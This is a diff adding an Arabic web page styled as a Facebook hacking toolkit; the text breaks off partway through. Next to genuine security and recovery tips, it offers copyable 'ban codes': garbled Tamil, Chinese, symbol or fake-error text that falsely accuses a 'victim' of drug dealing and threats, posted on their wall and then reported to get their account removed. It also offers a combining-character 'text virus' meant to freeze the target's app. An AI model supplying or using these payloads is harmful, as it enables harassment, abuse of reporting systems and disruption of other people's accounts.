@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>أداة مساعدة فيسبوك الشاملة</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <style>
+        body {
+            background-color: #000;
+            color: #00ff00;
+            font-family: 'Share Tech Mono', monospace;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        canvas { position: fixed; top: 0; left: 0; z-index: -1; }
+        header { text-align: center; padding: 1rem; width: 100%; }
+        header h1 {
+            font-size: 2.2em;
+            font-weight: bold;
+            text-shadow: 0 0 15px #0f0;
+            font-family: 'Cairo', sans-serif;
+            margin: 0;
+        }
+        .card { 
+            background: rgba(0, 0, 0, 0.8); 
+            border: 1px solid #0f0; 
+            border-radius: 10px; 
+            padding: 1.5rem; 
+            max-width: 600px; 
+            width: 95%;
+            margin: 1rem auto; 
+            box-shadow: 0 0 25px rgba(2, 255, 2, 0.4); 
+            animation: fadeIn 1.5s ease-in-out; 
+            text-align: center; 
+        }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 10px; font-size: 1.2em; font-family: 'Cairo', sans-serif; }
+        input[type="text"], select {
+            width: 95%;
+            padding: 0.8rem;
+            margin: 0 auto 1rem auto;
+            display: block;
+            border: 2px solid #0f0;
+            border-radius: 8px;
+            background: #000;
+            color: #0f0;
+            font-size: 1.1rem;
+            text-align: center;
+            font-family: 'Share Tech Mono', monospace;
+        }
+        select { cursor: pointer; }
+        .output-section {
+            display: none;
+            background: rgba(0, 0, 0, 0.85); 
+            border: 1px solid #0f0; 
+            border-radius: 10px; 
+            padding: 1.5rem; 
+            max-width: 600px; 
+            width: 95%;
+            margin: 1rem auto; 
+            box-shadow: 0 0 25px rgba(2, 255, 2, 0.4);
+            text-align: right;
+        }
+        .output-section h2 {
+            color: #fff;
+            font-family: 'Cairo', sans-serif;
+            text-align: center;
+            border-bottom: 1px solid #0f0;
+            padding-bottom: 10px;
+        }
+        textarea {
+            width: 95%;
+            padding: 0.8rem;
+            border: 2px solid #0f0;
+            border-radius: 8px;
+            background: #111;
+            color: #0f0;
+            font-size: 1rem;
+            font-family: 'Share Tech Mono', monospace;
+            resize: vertical;
+            margin-top: 10px;
+            direction: ltr;
+            text-align: left;
+        }
+        .copy-btn {
+            background-color: #0f0;
+            color: #000;
+            border: none;
+            padding: 8px 12px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: 700;
+            margin-top: 10px;
+            font-family: 'Cairo', sans-serif;
+            transition: all 0.3s;
+            float: left;
+            margin-left: 10px;
+        }
+        .copy-btn:hover { background-color: #fff; }
+        .main-btn {
+            background: #0f0;
+            color: #000;
+            padding: 12px 25px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 1.2em;
+            margin-top: 20px;
+            transition: all 0.3s;
+            font-family: 'Cairo', sans-serif;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+        }
+        main-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 25px;
+            width: 100%;
+            max-width: 500px;
+            box-sizing: border-box;
+        }
+        .logo-container { flex-shrink: 0; }
+        .profile-pic {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            border: 3px solid #FFD700;
+            object-fit: cover;
+            animation: spin 8s linear infinite;
+        }
+        .title-container {
+            margin-right: 20px;
+            overflow: hidden;
+            flex-grow: 1;
+            position: relative;
+            height: 40px;
+        }
+        .moving-text {
+            font-size: 28px;
+            font-weight: bold;
+            color: #f1f1f1;
+            white-space: nowrap;
+            position: absolute;
+            animation: move-right-to-left 10s linear infinite;
+        }
+        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        @keyframes move-right-to-left { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
+        .main-btn:hover { background: #111; color: #0f0; border: 2px solid #0f0; }
+        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        @keyframes move-right-to-left { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
+        .social-follow {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: -10px;
+            margin-bottom: 20px;
+        }
+        .warning {
+            color: #ff4136;
+            background-color: rgba(255, 65, 54, 0.1);
+            border: 1px solid #ff4136;
+            padding: 1rem;
+            border-radius: 8px;
+            margin: 1rem 0;
+            text-align: center;
+        }
+        .step { margin-bottom: 20px; padding-bottom: 20px; border-bottom: 1px dashed #0f0; }
+        .step:last-child { border-bottom: none; }
+        ul, ol { padding-right: 20px; }
+        li { margin-bottom: 10px; }
+        a { color: #39cccc; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+
+        @keyframes fadeIn { from {opacity: 0; transform: translateY(-20px);} to {opacity: 1; transform: translateY(0);} }
+    </style>
+</head>
+<body>
+    <canvas id="matrix-canvas"></canvas>
+
+    <header class="main-hesader">
+        <div class="logo-container">
+            <img src="fake facebook.png" alt="صورة محمود الشخصية" class="profile-pic">
+        </div>
+        <div class="title-container">
+            <h1 class="moving-text">ثغرات لل فيسبوك</h1>
+        </div>
+    </header>
+ 
+
+    <div class="card">
+        <div class="form-group">
+            <label for="taskType">اختر المهمة المطلوبة:</label>
+            <select id="taskType" onchange="handleSelection()">
+                <option value="" disabled selected>-- الرجاء الاختيار --</option>
+                <optgroup label="الأمان والخصوصية">
+                    <option value="secure_account">🔒 تأمين الحساب من الاختراق</option>
+                    <option value="profile_lock">🔐 قفل الملف الشخصي (Profile Lock)</option>
+                    <option value="disconnect_apps">🔌 إلغاء ربط التطبيقات والمواقع</option>
+                </optgroup>
+                <optgroup label="استرجاع الحسابات">
+                    <option value="recover_hacked">🔑 استرجاع حساب مخترق</option>
+                    <option value="recover_disabled">🛠️ استرجاع حساب معطل</option>
+                </optgroup>
+                <optgroup label="خدع وحيل">
+                    <option value="profile_visitors">🕵️ معرفة من زار بروفايلك (خدعة)</option>
+                    <option value="fancy_name">🎨 إنشاء اسم مزخرف/شفاف</option>
+                    <option value="blank_post">📄 نشر منشور فارغ</option>
+                </optgroup>
+
+                  <optgroup label="فيروسات واكود">
+                    
+    <option value="text_virus">☣️ فايروسات نصية (دعس)</option>
+    <option value="ban_code">🔥 كود تطير حسابات (إبلاغ)</option>
+    <option value="ban_code_tamil">🚫 كود إزالة حساب (تاميل)</option> 
+    <option value="ban_code_root">💣 كود إزالة (خطأ نظام)</option>
+    <option value="ban_code_mixed">☠️ كود إزالة (رموز مختلطة)</option>
+    <option value="important_links">🔗 روابط ونماذج هامة</option>
+                </optgroup>
+                    <optgroup label="إدارة الحساب ومشاكل متقدمة">
+                    <option value="report_impersonation">🎭 الإبلاغ عن حساب منتحل</option>
+    <option value="migrate_to_page">🔄 تحويل الحساب إلى صفحة</option>
+    <option value="report_impersonation">🎭 الإبلاغ عن حساب منتحل</option>
+    <option value="memorialize_account">🕊️ إحياء ذكرى حساب متوفى</option>
+    <option value="identity_exploit_warning">⚠️ التحذير من ثغرة تأكيد الهوية</option>   
+    
+</optgroup>
+
+                </optgroup>
+            </select>
+        </div>
+
+        <div id="recover_disabled-inputs" class="sub-inputs" style="display:none;">
+            <label for="userEmail">بريدك الإلكتروني:</label>
+            <input type="text" id="userEmail" placeholder="example@gmail.com">
+            <label for="userName">اسمك بالكامل في الحساب:</label>
+            <input type="text" id="userName" placeholder="Full Name">
+            <button class="main-btn" onclick="generateContent('recover_disabled')">إنشاء رسالة الاسترجاع</button>
+        </div>
+    </div>
+
+    <!-- أقسام المخرجات -->
+    <div id="secure_account-output" class="output-section"></div>
+    <div id="profile_lock-output" class="output-section"></div>
+    <div id="disconnect_apps-output" class="output-section"></div>
+    <div id="recover_hacked-output" class="output-section"></div>
+    <div id="recover_disabled-output" class="output-section"></div>
+    <div id="profile_visitors-output" class="output-section"></div>
+    <div id="fancy_name-output" class="output-section"></div>
+    <div id="blank_post-output" class="output-section"></div>
+    <div id="text_virus-output" class="output-section"></div>
+    <div id="migrate_to_page-output" class="output-section"></div>
+    <div id="report_impersonation-output" class="output-section"></div>
+    <div id="memorialize_account-output" class="output-section"></div>
+    <div id="identity_exploit_warning-output" class="output-section"></div>
+    <div id="ban_code-output" class="output-section"></div>
+    <div id="ban_code_tamil-output" class="output-section"></div>
+    <div id="ban_code_root-output" class="output-section"></div>
+    <div id="ban_code_mixed-output" class="output-section"></div>
+    <div id="important_links-output" class="output-section"></div>
+
+    <script>
+        // Matrix effect script
+        const canvas = document.getElementById('matrix-canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        const letters = 'FacebookMatrix0101Hacked';
+        const fontSize = 16;
+        const columns = canvas.width / fontSize;
+        const drops = Array(Math.floor(columns)).fill(1);
+
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#0F0';
+            ctx.font = fontSize + 'px monospace';
+            for (let i = 0; i < drops.length; i++) {
+                const text = letters.charAt(Math.floor(Math.random() * letters.length));
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+        setInterval(drawMatrix, 40);
+
+        // Tool logic
+        function handleSelection() {
+            const taskType = document.getElementById('taskType').value;
+            
+            document.querySelectorAll('.sub-inputs').forEach(el => el.style.display = 'none');
+            document.querySelectorAll('.output-section').forEach(el => el.style.display = 'none');
+
+            if (taskType === 'recover_disabled') {
+                const inputsToShow = document.getElementById(taskType + '-inputs');
+                if (inputsToShow) inputsToShow.style.display = 'block';
+            } else {
+                generateContent(taskType);
+            }
+        }
+
+        function generateContent(taskType) {
+            document.querySelectorAll('.output-section').forEach(el => el.style.display = 'none');
+            
+            let container;
+            switch (taskType) {
+                case 'secure_account':
+                    container = document.getElementById('secure_account-output');
+                    container.innerHTML = `<h2>خطوات تأمين حساب فيسبوك</h2><p>لحماية حسابك من السرقة والاختراق، اتبع هذه الخطوات الأساسية:</p><ol><li><strong>كلمة سر قوية:</strong> استخدم كلمة سر طويلة ومعقدة تحتوي على حروف كبيرة وصغيرة وأرقام ورموز.</li><li><strong>المصادقة الثنائية (2FA):</strong> هي أهم خطوة. اذهب إلى <strong>الإعدادات > الأمان وتسجيل الدخول > استخدام المصادقة الثنائية</strong>. قم بتفعيلها عبر تطبيق مصادقة (مثل Google Authenticator) أو عبر رسائل SMS.</li><li><strong>تنبيهات تسجيل الدخول:</strong> قم بتفعيل "تلقي تنبيهات بشأن عمليات تسجيل الدخول غير المعروفة" من نفس صفحة الأمان.</li><li><strong>مراجعة الأجهزة المسجل دخولك منها:</strong> تحقق من قائمة الأجهزة وقم بتسجيل الخروج من أي جهاز لا تعرفه.</li><li><strong>لا تضغط على روابط مشبوهة:</strong> احذر من الرسائل التي تطلب منك تسجيل الدخول من رابط غير رسمي.</li></ol>`;
+                    break;
+                case 'ban_code_tamil':
+    container = document.getElementById('ban_code_tamil-output');
+    container.innerHTML = `
+        <h2 style="color: #d32f2f;">كود إزالة حساب (بلغة التاميل)</h2>
+        <div class="warning">
+            <strong>تحذير:</strong> هذه الطريقة تعتمد على الإبلاغ عن حساب باستخدام نص بلغة أجنبية لزيادة فرصة المراجعة الآلية. استخدامها بشكل متكرر أو خبيث قد يعرض حسابك أنت للخطر. استخدمها على مسؤوليتك.
+        </div>
+        <div class="step">
+            <h3>التعليمات</h3>
+            <ol>
+                <li>انسخ الكود التالي.</li>
+                <li>ضعه في تعليق على منشور للضحية.</li>
+                <li>قم بالإبلاغ عن الحساب أو التعليق بتهمة "محتوى غير مرغوب فيه" أو "انتحال شخصية" أو "محتوى عنيف".</li>
+            </ol>
+        </div>
+        <div class="step">
+            <h3>الكود (لغة تاميلية)</h3>
+            <textarea id="ban-code-tamil-text" style="height: 200px;" readonly>வணக்கம் "பேஸ்புக், இந்த மனிதன் விதிமுறை பேஸ்புக் Almstkhmon சமூகத்தில் நான் திகில் படங்களை posted தாண்டி ஒரு ஆபத்து உள்ளது மற்றும் என் வாழ்க்கையில், நான் உங்கள் சமூகத்தில். இல்லையென்றால், என் நண்பர்கள், மற்றும் கூட வெளியிடப்படும் என்று" அது மீறுகின்றது ஆபாச உள்ளடக்கங்களை பேஸ்புக் சமூக தரநிலைகள் தரம் மற்றும் கருத்துத் திருட்டு கூறினார் என் மக்கள் முன் நபர் நான் அதன் கணக்கில் உள்ளடக்கத்தை அவளை அனுப்ப என்று
+மற்றும் தளத்தில் astazi கூடுதலாக, அவர் ஒரு ஒளிரும் ஒரு பேஸ்புக் கணக்கு சொந்தமாக அனுமதி ஐ.ஏ .hula வயது விரைவில் கணக்கு மூடப்பட்டது சட்டத்தின் கீழ் ஒரு பேஸ்புக் கணக்கு சொந்தமாக
+நன்றி</textarea>
+            <button class="copy-btn" onclick="copyToClipboard(document.getElementById('ban-code-tamil-text'))">نسخ الكود</button>
+        </div>
+    `;
+    break;
+                case 'ban_code_root':
+    container = document.getElementById('ban_code_root-output');
+    container.innerHTML = `
+        <h2 style="color: #d32f2f;">كود إزالة حساب (خطأ نظام Root)</h2>
+        <div class="warning">
+            <strong>تحذير:</strong> هذه الطريقة تعتمد على خداع أنظمة المراجعة بنص يوحي بوجود خطأ تقني خطير أو انتهاك لسياسات الأنظمة. استخدامها بشكل متكرر قد يعرض حسابك للخطر. استخدمها على مسؤوليتك.
+        </div>
+        <div class="step">
+            <h3>التعليمات</h3>
+            <ol>
+                <li>انسخ الكود التالي.</li>
+                <li>ضعه في تعليق على منشور للضحية (يفضل تكراره عدة مرات).</li>
+                <li>قم بالإبلاغ عن الحساب أو التعليقات بتهمة "محتوى غير مرغوب فيه" أو "سبام".</li>
+            </ol>
+        </div>
+        <div class="step">
+            <h3>الكود (نص خطأ تقني)</h3>
+            <textarea id="ban-code-root-text" style="height: 200px;" readonly>There was a problem opening a shell with root
+|caused Dy
+Superuser/
+SuperSu or by a device that is inproperly rooted.
+o Update BUsybox
+Try
+oving superuser/supersu permissions.
+O annlicatinn and then reganting superuser
+Supersu permissions for this application.
+Vou can check your device to see if it is
+properly
+Androikat
+Uninstall</textarea>
+            <button class="copy-btn" onclick="copyToClipboard(document.getElementById('ban-code-root-text'))">نسخ الكود</button>
+        </div>
+    `;
+    break;
+                case 'profile_lock':
+                    container = document.getElementById('profile_lock-output');
+                    container.innerHTML = `<h2>قفل الملف الشخصي (Profile Lock)</h2><p>هذه الميزة تجعل ملفك الشخصي أكثر خصوصية، حيث لا يمكن لغير الأصدقاء رؤية صورك ومنشوراتك أو تكبير صورة ملفك الشخصي.</p><div class="step"><h3>كيفية التفعيل</h3><ol><li>اذهب إلى ملفك الشخصي.</li><li>اضغط على الثلاث نقاط (...) بجانب "تعديل الملف الشخصي".</li><li>ابحث عن خيار "قفل الملف الشخصي" (Lock Profile).</li></ol></div><div class="warning"><strong>ملاحظة:</strong> إذا لم يكن الخيار متاحًا في بلدك، يمكنك محاولة استخدام تطبيق VPN والاتصال بخادم في دولة تتوفر بها الميزة (مثل الهند أو مصر)، ثم اتبع الخطوات السابقة.</div>`;
+                    break;
+                case 'disconnect_apps':
+                    container = document.getElementById('disconnect_apps-output');
+                    container.innerHTML = `<h2>إلغاء ربط التطبيقات والمواقع بحسابك</h2><p>الكثير من التطبيقات والمواقع تطلب تسجيل الدخول عبر فيسبوك، مما يمنحها صلاحية الوصول لبعض بياناتك. من المهم مراجعتها وإزالتها بشكل دوري.</p><div class="step"><h3>الخطوات</h3><ol><li>اذهب إلى <strong>الإعدادات والخصوصية > الإعدادات</strong>.</li><li>مرر لأسفل حتى تجد قسم "الأذونات" واختر <strong>"التطبيقات ومواقع الويب"</strong>.</li><li>ستظهر لك قائمة بكل التطبيقات والمواقع المرتبطة بحسابك.</li><li>حدد أي تطبيق لم تعد تستخدمه واضغط على <strong>"إزالة"</strong>.</li></ol></div><p>هذه الخطوة تمنع تلك التطبيقات من جمع المزيد من البيانات عنك في المستقبل.</p>`;
+                    break;
+                case 'recover_hacked':
+                    container = document.getElementById('recover_hacked-output');
+                    container.innerHTML = `<h2>استرجاع حساب فيسبوك مخترق</h2><p>إذا تم الاستيلاء على حسابك وتغيير كلمة السر أو البريد الإلكتروني، اتبع الخطوات التالية فورًا:</p><div class="step"><h3>الخطوة 1: استخدام صفحة الإبلاغ الرسمية</h3><p>اذهب مباشرة إلى الرابط التالي الذي خصصه فيسبوك لهذه المشكلة:</p><p style="text-align:center;"><a href="https://www.facebook.com/hacked" target="_blank">www.facebook.com/hacked</a></p><p>اضغط على "تم اختراق حسابي" واتبع التعليمات التي تظهر على الشاشة. سيطلب منك فيسبوك إدخال بريد إلكتروني أو رقم هاتف قديم للتعرف عليك.</p></div><div class="step"><h3>الخطوة 2: إثبات الهوية</h3><p>إذا لم تتمكن من الوصول لحسابك بالطريقة السابقة، قد يطلب منك فيسبوك إثبات هويتك عن طريق رفع صورة لبطاقة هويتك (البطاقة الشخصية، جواز السفر، إلخ). تأكد أن الاسم وتاريخ الميلاد في الهوية يطابقان معلومات حسابك.</p></div><div class="warning"><strong>ملاحظة هامة:</strong> لا تثق بأي شخص يدعي أنه يستطيع استرجاع حسابك مقابل المال. الطريقة الرسمية هي الطريقة الوحيدة الآمنة.</div>`;
+                    break;
+                case 'recover_disabled':
+                    const email = document.getElementById('userEmail').value;
+                    const name = document.getElementById('userName').value;
+                    if (!email || !name) { alert('الرجاء إدخال البريد الإلكتروني والاسم الكامل.'); return; }
+                    container = document.getElementById('recover_disabled-output');
+                    container.innerHTML = `<h2>مراسلة الدعم لاسترجاع حساب معطل</h2><p>إذا تم تعطيل حسابك بالخطأ، يمكنك مراسلة فيسبوك. أرسل الرسالة التالية إلى عناوين البريد الإلكتروني المخصصة للدعم.</p><div class="step"><h3>عناوين البريد للدعم:</h3><textarea readonly>disabled@fb.com, appeals@fb.com</textarea><button class="copy-btn" onclick="copyToClipboard(this.previousElementSibling)">نسخ</button></div><div class="step" style="clear:both; padding-top:10px;"><h3>الموضوع:</h3><textarea readonly>My personal account was disabled by mistake</textarea><button class="copy-btn" onclick="copyToClipboard(this.previousElementSibling)">نسخ</button></div><div class="step" style="clear:both; padding-top:10px;"><h3>نص الرسالة:</h3><textarea readonly>Hello Facebook Support Team,\n\nMy personal Facebook account has been disabled, and I believe this was a mistake. I have not violated any of the Facebook Community Standards.\n\nMy account details are:\nFull Name: ${name}\nEmail: ${email}\n\nPlease review my case and reactivate my account as soon as possible.\n\nThank you.</textarea><button class="copy-btn" onclick="copyToClipboard(this.previousElementSibling)">نسخ</button></div><p style="clear:both; padding-top:10px;"><strong>ملاحظة:</strong> لا تنسَ إرفاق صورة واضحة من بطاقة هويتك مع البريد الإلكتروني.</p>`;
+                    break;
+                case 'ban_code':
+    container = document.getElementById('ban_code-output');
+    container.innerHTML = `
+        <h2 style="color: #d32f2f;">كود تطير حسابات (عبر الإبلاغ)</h2>
+        <div class="warning">
+            <strong>تحذير شديد:</strong> هذه الطريقة تعتمد على إرسال نصوص مضللة ثم الإبلاغ عنها. استخدامها ينتهك سياسات فيسبوك بشكل خطير وقد يؤدي إلى حظر حسابك أنت بشكل دائم. استخدمها على مسؤوليتك الكاملة.
+        </div>
+        <div class="step">
+            <h3>التعليمات</h3>
+            <ol>
+                <li>انسخ الكود التالي.</li>
+                <li>ضعه في تعليق على أي منشور في حساب الضحية.</li>
+                <li>بعد نشر التعليق مباشرة، قم بالإبلاغ عن التعليق نفسه بتهمة "سبام" أو "محتوى زائف".</li>
+            </ol>
+        </div>
+        <div class="step">
+            <h3>الكود (لغة صينية مضللة)</h3>
+            <textarea id="ban-code-text" style="height: 150px;" readonly>該人可以進一步威脅我的Bouktrac帳戶，並滲透到在Facebook上越過699台設備的兩個人，這個人非常非常危險，我有一群賣毒品的Kteron人，也有賣毒品的Loigion人，也被Favozion使用並導致該物質上癮。 “項目步驟”不僅鼓勵吸毒者停止使用酒精或其他毒品，而且要學習和改變與十種種族成癮計劃有關的生活方式。許多程序聲稱恢復不是力量，也不是武器，目標是建立平衡的武器真空。永久程序正在進行中。我們沒有議程，我們的目標是不再希望自己破壞頻譜。請Mark先生刪除最新的Hama Hama帳戶的所有者會威脅我嗎</textarea>
+            <button class="copy-btn" onclick="copyToClipboard(document.getElementById('ban-code-text'))">نسخ الكود</button>
+        </div>
+    `;
+    break;
+                case 'ban_code_mixed':
+    container = document.getElementById('ban_code_mixed-output');
+    container.innerHTML = `
+        <h2 style="color: #d32f2f;">كود إزالة حساب (رموز مختلطة)</h2>
+        <div class="warning">
+            <strong>تحذير:</strong> هذه الطريقة تعتمد على استخدام خليط من الرموز واللغات لإرباك أنظمة المراجعة. استخدامها بشكل متكرر قد يعرض حسابك للخطر. استخدمها على مسؤوليتك الكاملة.
+        </div>
+        <div class="step">
+            <h3>التعليمات</h3>
+            <ol>
+                <li>انسخ الكود التالي.</li>
+                <li>ضعه في تعليق على منشور للضحية (يفضل تكراره).</li>
+                <li>قم بالإبلاغ عن الحساب أو التعليقات بتهمة "محتوى غير مرغوب فيه" أو "سبام" أو "خطاب يحض على الكراهية".</li>
+            </ol>
+        </div>
+        <div class="step">
+            <h3>الكود (رموز صينية ويابانية مختلطة)</h3>
+            <textarea id="ban-code-mixed-text" style="height: 200px;" readonly>鯿鰚📌鯳闦鱍🔪闪鰳阥💣阝轷陁💀輏陋●辖軰輄輍穩●轲竱🔕轸穙轪笏竦柱窋●枤枥竲笕窪📀窮端窶冷冺决冹内█佬伶〇رابط〇侺侽俘侘✂倄伮佛亮佑㈣㊣🔽💣ボ㈱ゐゑ💊💊ぽぼ💿ぬぱざそha: medal : 鯿鰚📌鯳闦鱍🔪闪鰳阥💣阝轷陁💀輏陋●辖軰輄輍穩●轲竱🔕轸穙轪笏竦柱窋●枤枥竲笕窪📀窮端窶冷冺决冹内█佬伶〇رابط〇侺侽俘侘✂倄伮佛亮佑㈣㊣🔽💣ボ㈱ゐゑ💊💊ぽぼ💿ぬぱざそha: medal : 鯿鰚📌鯳闦鱍🔪闪鰳阥💣阝轷陁💀輏陋●辖軰輄輍穩●轲竱🔕轸穙轪笏竦柱窋●枤枥竲笕窪📀窮端窶冷冺决冹内█佬伶〇رابط〇侺侽俘侘✂_伮佛亮佑㈣㊣🔽💣ボ㈱ゐゑ💊💊ぽぼ💿ぬぱざそha: medal : 鯿鰚📌鯳闦鱍🔪闪鰳阥💣阝轷陁💀輏陋●辖軰輄輍穩●轲竱🔕轸穙轪笏竦柱窋●枤枥竲笕窪📀窮端窶冷冺决冹内█佬伶〇رابط〇侺侽俘侘✂倄伮佛亮佑㈣㊣🔽💣ボ㈱ゐゑ💊💊ぽぼ💿ぬぱざそha: medal : 鯿鰚📌鯳闦鱍🔪闪鰳阥💣阝轷陁💀輏陋●辖軰輄輍穩●轲竱🔕轸穙轪笏竦柱窋●枤枥竲笕窪📀窮端窶冷冺决冹内█佬伶〇رابط〇侺侽俘侘✂倄伮佛亮佑㈣㊣🔽💣ボ㈱ゐゑ💊💊ぽぼ💿ぬぱざそha: medal : 鯿鰚📌鯳闦鱍🔪闪鰳阥💣阝轷陁💀輏陋●辖軰輄輍穩●轲竱🔕轸穙轪笏竦柱窋●枤枥竲笕窪📀窮端窶冷冺决冹内█佬伶〇رابط〇侺侽俘侘✂倄伮佛亮佑㈣،💣ボ㈱ゐゑ💊💊ぽぼ💿ぬぱざそ</textarea>
+            <button class="copy-btn" onclick="copyToClipboard(document.getElementById('ban-code-mixed-text'))">نسخ الكود</button>
+        </div>
+    `;
+    break;
+                case 'profile_visitors':
+                    container = document.getElementById('profile_visitors-output');
+                    container.innerHTML = `<h2>خدعة معرفة من زار بروفايلك</h2><p class="warning"><strong>تنبيه:</strong> لا توجد طريقة رسمية أو دقيقة 100% لمعرفة من زار ملفك الشخصي على فيسبوك. الطريقة التالية هي خدعة برمجية شائعة تظهر لك أصدقاءك الذين تتفاعل معهم كثيرًا، وليس بالضرورة الزوار.</p><ol><li>افتح صفحة ملفك الشخصي على فيسبوك من متصفح الكمبيوتر.</li><li>اضغط بـ "كليك يمين" في أي مكان فارغ واختر "عرض مصدر الصفحة" (View Page Source) أو اضغط ` + "`Ctrl+U`" + `.</li><li>في صفحة الكود، اضغط ` + "`Ctrl+F`" + ` للبحث، واكتب: <strong>InitialChatFriendsList</strong></li><li>ستجد قائمة من الأرقام بعد هذه الكلمة. كل رقم هو ID (معرف) حساب شخصي لأحد أصدقائك.</li><li>انسخ أي رقم من هذه الأرقام (بدون "-2" في نهايته)، ثم ضعه بعد رابط فيسبوك هكذا: <code>facebook.com/الرقم المنسوخ</code></li></ol><p><strong>النتيجة:</strong> هذه القائمة غالبًا ما تعكس الأشخاص الذين تتفاعل معهم (تراسلهم، تعلق لهم، إلخ) وليس بالضرورة من يزورون بروفايلك سرًا.</p>`;
+                    break;
+                case 'fancy_name':
+                    container = document.getElementById('fancy_name-output');
+                    container.innerHTML = `<h2>إنشاء اسم مزخرف أو شفاف</h2><p>لتغيير اسمك إلى شكل مزخرف أو فارغ (شفاف)، يمكنك استخدام رموز خاصة.</p><div class="step"><h3>الاسم الشفاف (فارغ)</h3><p>انسخ الرمز الموجود بين القوسين. قد لا يظهر لك شيء، لكنه حرف موجود.</p><textarea readonly style="text-align:center;">(ARAJ)</textarea><button class="copy-btn" onclick="copyToClipboard(this.previousElementSibling)">نسخ الرمز</button></div><div class="step" style="clear:both; padding-top:10px;"><h3>التعليمات</h3><ol><li>اذهب إلى <a href="https://www.facebook.com/settings?tab=account" target="_blank">إعدادات الحساب</a> لتغيير الاسم.</li><li>الصق الرمز الذي نسخته في خانة الاسم الأول والأخير.</li><li>قد يطلب فيسبوك استخدام VPN وتغيير الدولة إلى إندونيسيا أو بنغلاديش لقبول الاسم.</li></ol></div><div class="warning"><strong>تحذير:</strong> تغيير الاسم بشكل متكرر أو استخدام أسماء غير حقيقية قد يعرض حسابك للتعطيل.</div>`;
+                    break;
+                case 'blank_post':
+                    container = document.getElementById('blank_post-output');
+                    container.innerHTML = `<h2>نشر منشور أو تعليق فارغ</h2><p>للقيام بهذه الخدعة، يمكنك استخدام رمز خاص غير مرئي.</p><div class="step"><h3>الرمز السحري</h3><p>انسخ الرمز التالي. سيبدو فارغًا ولكنه يحتوي على حرف خاص.</p><textarea readonly style="text-align:center;">&#8203;</textarea><button class="copy-btn" onclick="copyToClipboard(this.previousElementSibling)">نسخ الرمز</button></div><div class="step" style="clear:both; padding-top:10px;"><h3>التعليمات</h3><p>الصق الرمز الذي نسخته في مربع إنشاء منشور جديد أو في خانة التعليقات واضغط "نشر".</p></div>`;
+                    break;
+                case 'text_virus':
+                    container = document.getElementById('text_virus-output');
+                    container.innerHTML = `<h2>فايروس نصي لتعليق الحسابات (دعس)</h2><div class="warning"><strong>تحذير شديد:</strong> استخدام هذه النصوص قد يؤدي إلى تعليق حسابات الآخرين بشكل مؤقت، ولكنه أيضًا ينتهك شروط خدمة فيسبوك وقد يعرض حسابك أنت للحظر أو التقييد. استخدمه على مسؤوليتك الكاملة.</div><div class="step"><h3>فايروس نصي (نموذج 1)</h3><p>انسخ النص التالي والصقه في تعليق على منشور الضحية. كثرة الرموز قد تسبب بطئًا شديدًا أو تعليقًا لتطبيق فيسبوك عند الشخص المستهدف.</p><textarea id="virus-code" style="height: 200px;" readonly>Ba߷⃒⃓⃑⃔⃕⃖⃛⃜⃝۝۞۩߷⃒⃓⃑⃔⃕⃖⃛⃜⃝⃠⃒⃓⃑⃔⃕⃖⃛⃜⃝⃠⃒⃓⃑⃔⃕⃖⃛⃜⃝⃠⃒⃓⃑⃔⃕⃖⃛⃜⃝⃠۝۞۩߷⃒⃓⃑⃔⃕⃖⃛⃜⃝۝۞۩߷⃒⃓⃑⃔⃕⃖⃛⃜⃝⃠⃒⃓⃑⃔⃕⃖⃛⃜⃝⃠⃒⃓⃑⃔⃕⃖⃛⃜⃝⃠⃒⃓⃑⃔⃕⃖⃛⃜⃝⃠۝۞۩߷⃒⃓⃑⃔⃕⃖⃛⃜⃝۝۞۩߷⃒⃓⃑⃔⃕⃖⃛⃜⃝⃠⃒⃓⃑⃔⃕⃖⃛⃜⃝⃠⃒⃓⃑⃔⃕⃖⃛⃜⃝⃠⃒⃓⃑⃔⃕⃖⃛⃜⃝⃠۝۞۩߷⃒⃓⃑⃔⃕⃖⃛⃜⃝۝۞۩߷⃒⃓⃑⃔⃕⃖⃛⃜⃝⃠⃒⃓⃑⃔⃕⃖⃛⃜⃝⃠⃒⃓⃑⃔⃕⃖⃛⃜⃝⃠⃒⃓⃑⃔⃕⃖⃛⃜⃝⃠۝۞۩߷⃒⃓⃑⃔⃕⃖⃛⃜⃝۝۞۩߷⃒⃓⃑⃔⃕⃖⃛⃜⃝⃠⃒⃓⃑⃔⃕⃖⃛⃜⃝⃠⃒⃓⃑⃔⃕⃖⃛⃜⃝⃠⃒⃓⃑⃔⃕⃖⃛⃜⃝⃠۝۞۩߷⃒⃓⃑⃔⃕⃖⃛⃜⃝۝۞۩߷⃒⃓⃑⃔⃕⃖⃛⃜⃝⃠⃑▇ Moradi ▇ 
+.li*▇▇▏◥▇◣┊◢▇◤▕▇▇*li. 
+.li*▇▇▏▃▆▅▎▅▆▃▕▇▇*li. 
